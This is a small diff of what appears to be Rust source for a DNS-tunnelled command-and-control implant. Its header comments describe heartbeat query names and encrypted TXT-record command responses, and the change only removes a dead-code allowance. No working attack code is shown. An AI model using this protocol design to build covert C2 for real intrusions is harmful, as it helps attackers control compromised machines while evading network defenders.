@@ -4,9 +4,6 @@
 //! Heartbeat: {session_6hex}0000.hb.c2.{domain}  (total=00 idx=00)
 //! Response: TXT = BASE32NOPAD(encrypt_stateless(key, json_cmd)) or empty NOERROR
 
-// Transport wiring (T9) not yet complete; suppress until then.
-#![allow(dead_code)]
-
 use anyhow::{Context, Result};
 use data_encoding::BASE32_NOPAD;
 use flate2::{write::GzEncoder, Compression};
